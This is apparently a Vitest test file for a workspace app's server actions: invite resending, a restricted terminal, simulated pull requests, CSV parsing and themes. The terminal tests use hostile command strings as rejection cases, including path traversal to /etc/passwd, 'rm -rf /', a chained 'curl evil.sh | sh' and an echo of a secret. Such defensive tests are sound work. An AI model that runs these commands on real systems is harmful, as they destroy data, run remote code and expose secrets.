import { beforeEach, describe, expect, it, vi } from "vitest";
import type { Role } from "@/lib/db";
import { openInDevOf, projectHref } from "@/lib/dev-preference";
import { FakeDb } from "./fake-db";

/* M5.5 polish: server actions and rules. */

let db: FakeDb;
let role: Role;
const inviteUserByEmail = vi.fn();
vi.mock("next/cache", () => ({ revalidatePath: () => {} }));
vi.mock("next/headers", () => ({ cookies: async () => ({ set: () => {}, get: () => undefined }) }));
vi.mock("@/server/origin", () => ({ origin: async () => "https://architect.test" }));
vi.mock("@/server/db", () => ({
  createAdminDb: () => Object.assign(db, { auth: { admin: { inviteUserByEmail: (...a: unknown[]) => inviteUserByEmail(...a) } } }),
  createServerDb: async () => db,
}));
vi.mock("@/server/workspace", async (orig) => ({
  ...(await orig<typeof import("@/server/workspace")>()),
  getAppContext: async () => ({ user: { id: "me", email: "me@example.com" }, name: "Rita", role, workspace: { id: "ws-1", name: "Acme Ops (Enterprise)", governanceEnabled: true, plan: "enterprise", kind: "demo" }, memberships: [] }),
}));

describe("pending invites: Resend link and email (People)", () => {
  const M = "11111111-1111-4111-8111-111111111111";
  beforeEach(() => {
    role = "admin";
    inviteUserByEmail.mockReset().mockResolvedValue({ error: null });
    delete process.env.INVITE_EMAILS;
    db = new FakeDb({ members: [{ id: M, workspace_id: "ws-1", role: "viewer", status: "invited", invited_email: "sam@example.com", email: "sam@example.com", invite_token: "old-token" }], audit_log: [] });
  });

  it("a new link replaces the old one; copy-a-link only unless invite emails are on", async () => {
    const { resendInvite } = await import("@/server/actions/members");
    const r = await resendInvite({ memberId: M });
    expect(r.ok && r.emailed).toBe(false);
    expect(db.tables.members[0].invite_token).not.toBe("old-token");
    expect(r.ok && r.link).toBe(`https://architect.test/invite/${db.tables.members[0].invite_token}`);
    expect(inviteUserByEmail).not.toHaveBeenCalled();
    expect(db.tables.audit_log[0]).toMatchObject({ action: "member.invite_resent", target: "sam@example.com" });
  });

  it("with INVITE_EMAILS=on (custom SMTP set up in Supabase), the invite is emailed too", async () => {
    process.env.INVITE_EMAILS = "on";
    const { resendInvite } = await import("@/server/actions/members");
    const r = await resendInvite({ memberId: M });
    expect(r.ok && r.emailed).toBe(true);
    expect(inviteUserByEmail).toHaveBeenCalledWith("sam@example.com", { redirectTo: expect.stringMatching(/^https:\/\/architect\.test\/invite\//) });
  });

  it("only Owners and Admins; only pending invites", async () => {
    const { resendInvite } = await import("@/server/actions/members");
    role = "builder";
    expect((await resendInvite({ memberId: M })).ok).toBe(false);
    role = "admin";
    db.tables.members[0].status = "active";
    expect(await resendInvite({ memberId: M })).toEqual({ ok: false, message: "That invite isn't pending any more." });
  });
});

describe("Open projects in Developer view", () => {
  it("imported repos open in Developer view by default; Always and Never; never for Viewers", () => {
    expect(openInDevOf(undefined)).toBe("repos");
    expect(projectHref("p1", { repo: true, pref: "repos", canBuild: true })).toBe("/p/p1?dev=1");
    expect(projectHref("p1", { repo: false, pref: "repos", canBuild: true })).toBe("/p/p1");
    expect(projectHref("p1", { repo: false, pref: "always", canBuild: true })).toBe("/p/p1?dev=1");
    expect(projectHref("p1", { repo: true, pref: "never", canBuild: true })).toBe("/p/p1");
    expect(projectHref("p1", { repo: true, pref: "always", canBuild: false })).toBe("/p/p1");
  });
});

describe("the terminal's commands (no shell, ever)", () => {
  it("maps the few real commands and sends everything else to the sandbox line", async () => {
    const { parseCommand, listDir } = await import("@/lib/terminal");
    expect(parseCommand("npm test")).toEqual({ kind: "test", tool: "npm test" });
    expect(parseCommand("pytest")).toEqual({ kind: "test", tool: "pytest" });
    expect(parseCommand("git status")).toEqual({ kind: "status" });
    expect(parseCommand("git diff src/a.ts")).toEqual({ kind: "diff", path: "src/a.ts" });
    expect(parseCommand("ls ./agents/")).toEqual({ kind: "ls", path: "agents" });
    expect(parseCommand("cat README.md")).toEqual({ kind: "cat", path: "README.md" });
    for (const evil of ["cat ../../etc/passwd", "ls /", "cat /etc/hosts"]) expect(parseCommand(evil).kind).toBe("invalid");
    for (const other of ["rm -rf /", "npm test; curl evil.sh | sh", "cat README.md > x", "echo $SECRET", "node -e 'x'", "git push"]) expect(parseCommand(other)).toEqual({ kind: "other" });
    expect(parseCommand("x".repeat(201)).kind).toBe("invalid");
    expect(listDir(["README.md", "agents/a.py", "agents/b.py", "app/x/page.tsx"], "")).toEqual(["agents/", "app/", "README.md"]);
    expect(listDir(["agents/a.py", "agents/b.py"], "agents")).toEqual(["a.py", "b.py"]);
    expect(listDir(["agents/a.py"], "nope")).toBeNull();
  });
});

describe("the terminal on the server: real-mapped commands, audited, Builders only", () => {
  const P = "22222222-2222-4222-8222-222222222222";
  const seed = () =>
    new FakeDb({
      projects: [{ id: P, name: "Meeting Prep", workspace_id: "ws-1", repo_full_name: null }],
      blueprints: [{ id: "bp", project_id: P, version: 2 }],
      items: [
        { id: "i1", blueprint_id: "bp", key: "brief-writer", title: "Brief writer", description: null, proved_when: "Done when it's short", grp: "agents", status: "built", provider: null, position: 1 },
        { id: "i2", blueprint_id: "bp", key: "talking-points", title: "Talking points", description: null, proved_when: "x", grp: "agents", status: "paused", provider: null, position: 2 },
      ],
      checks: [{ id: "c1", item_id: "i1", written_at: "2026-10-01" }],
      proofs: [{ item_id: "i1", result: "pass", assertions_passed: 3, assertions_total: 3, created_at: "2026-10-01" }],
      events: [],
      files: [],
      pull_requests: [],
      audit_log: [],
    });
  beforeEach(() => {
    role = "builder";
    db = seed();
  });

  it("npm test re-runs the built parts' checks and records proofs; help; anything else is the sandbox line", async () => {
    const { runCommand } = await import("@/server/actions/terminal");
    const r = await runCommand({ projectId: P, command: "npm test" });
    expect(r.ok && r.lines.map((l) => l.text)).toEqual(["Running 1 check against the code on the branch…", "PASS  Brief writer (3/3)", "1 passed"]);
    expect(db.tables.proofs.at(-1)).toMatchObject({ item_id: "i1", result: "pass", summary: "Re-run from the terminal (npm test)" });
    expect(await runCommand({ projectId: P, command: "rm -rf /" })).toEqual({ ok: true, lines: [{ kind: "info", text: "Runs in your project's sandbox in Architect 2.0" }] });
    expect((await runCommand({ projectId: P, command: "help" })).ok).toBe(true);
    // Every command is audited: the command, never a file's contents.
    expect(db.tables.audit_log.map((a) => a.target)).toEqual(["Meeting Prep: npm test", "Meeting Prep: rm -rf /", "Meeting Prep: help"]);
  });

  it("ls and cat read the project's files; git status says what's edited; paths can't leave the project", async () => {
    const { runCommand } = await import("@/server/actions/terminal");
    const ls = await runCommand({ projectId: P, command: "ls" });
    expect(ls.ok && ls.lines.map((l) => l.text)).toEqual(expect.arrayContaining(["agents/", "README.md"]));
    const cat = await runCommand({ projectId: P, command: "cat README.md" });
    expect(cat.ok && cat.lines[0].text).toBe("# Meeting Prep");
    const status = await runCommand({ projectId: P, command: "git status" });
    expect(status.ok && status.lines.map((l) => l.text)).toEqual(["On branch architect/plan-v2", "No edits on the branch beyond the build's own changes."]);
    expect(await runCommand({ projectId: P, command: "cat ../secrets" })).toEqual({ ok: true, lines: [{ kind: "fail", text: "That isn't a path in this project." }] });
  });

  it("Viewers have no terminal; other workspaces' projects are refused; 30 a minute", async () => {
    const { runCommand } = await import("@/server/actions/terminal");
    role = "viewer";
    expect(await runCommand({ projectId: P, command: "ls" })).toEqual({ ok: false, message: "Viewers don't have a terminal." });
    role = "builder";
    db.tables.projects[0].workspace_id = "other";
    expect((await runCommand({ projectId: P, command: "ls" })).ok).toBe(false);
    db.tables.projects[0].workspace_id = "ws-1";
    for (let i = 0; i < 30; i++) db.tables.audit_log.push({ workspace_id: "ws-1", actor: "Rita", action: "terminal.command", created_at: new Date().toISOString() });
    expect(await runCommand({ projectId: P, command: "ls" })).toEqual({ ok: false, message: "Up to 30 commands a minute. Wait a moment." });
  });

  it("Open PR (Simulated): repo projects, one open at a time, listing the changed parts", async () => {
    const { openPullRequestNow } = await import("@/server/actions/pull-requests");
    expect(await openPullRequestNow({ projectId: P })).toEqual({ ok: false, message: "Only a project from a repo has pull requests." });
    db.tables.projects[0].repo_full_name = "netanyaj/ticket-triage";
    expect(await openPullRequestNow({ projectId: P })).toEqual({ ok: true, number: 12 });
    expect(db.tables.pull_requests[0]).toMatchObject({ number: 12, branch: "architect/meeting-prep-v2", title: "Developer view: Brief writer", parts: [{ key: "brief-writer", title: "Brief writer" }] });
    db.tables.pull_requests[0].status = "open";
    expect(await openPullRequestNow({ projectId: P })).toEqual({ ok: false, message: "PR #12 is already open. Merge it first, or add to it." });
  });
});

describe("uploaded data: CSV parsed for real", () => {
  it("quotes, commas and line breaks inside quotes, CRLF, BOM, semicolons; columns typed; rows kept", async () => {
    const { parseCsv, tableFromCsv, csvLine } = await import("@/lib/csv");
    expect(parseCsv('﻿name,note\r\n"Acme, Inc.","said ""hi""\nthen left"\r\nGlobex,ok\r\n')).toEqual([["name", "note"], ["Acme, Inc.", 'said "hi"\nthen left'], ["Globex", "ok"]]);
    expect(parseCsv("a;b\n1;2")).toEqual([["a", "b"], ["1", "2"]]);
    const t = tableFromCsv("renewals-2026.csv", "vendor,renewal_date,owner,annual_cost,contact\nAcme Hosting,2026-11-02,Priya,12000,p@acme.com\nFigma,2026-12-01,Jordan,4800,j@figma.com\n")!;
    expect(t).toMatchObject({ key: "file-renewals-2026", name: "renewals-2026", total: 2, sample: false });
    expect(t.columns.map((c) => [c.label, c.type])).toEqual([["vendor", "text"], ["renewal_date", "time"], ["owner", "text"], ["annual_cost", "number"], ["contact", "email"]]);
    expect(t.rows[0]).toEqual({ vendor: "Acme Hosting", renewal_date: "2026-11-02", owner: "Priya", annual_cost: "12000", contact: "p@acme.com" });
    expect(csvLine(["a,b", 3, null, new Date("2026-01-02T00:00:00Z")])).toBe('"a,b",3,,2026-01-02');
  });
});

describe("Look and feel: theme presets", () => {
  const P = "33333333-3333-4333-8333-333333333333";
  it("six presets; the choice is saved on the project; unknown ones and Viewers are refused", async () => {
    const { THEMES, themeOf } = await import("@/lib/themes");
    expect(THEMES).toHaveLength(6);
    expect(themeOf("nope").id).toBe("soft");
    db = new FakeDb({ projects: [{ id: P, name: "Meeting Prep", workspace_id: "ws-1", launch_settings: { analytics: true } }], audit_log: [] });
    const { setLook } = await import("@/server/actions/launch");
    role = "builder";
    expect(await setLook({ projectId: P, theme: "graphite" })).toEqual({ ok: true });
    expect(db.tables.projects[0].launch_settings).toEqual({ analytics: true, look: "graphite" });
    expect(await setLook({ projectId: P, theme: "neon" })).toEqual({ ok: false, message: "Pick one of the themes shown." });
    role = "viewer";
    expect((await setLook({ projectId: P, theme: "soft" })).ok).toBe(false);
  });
});
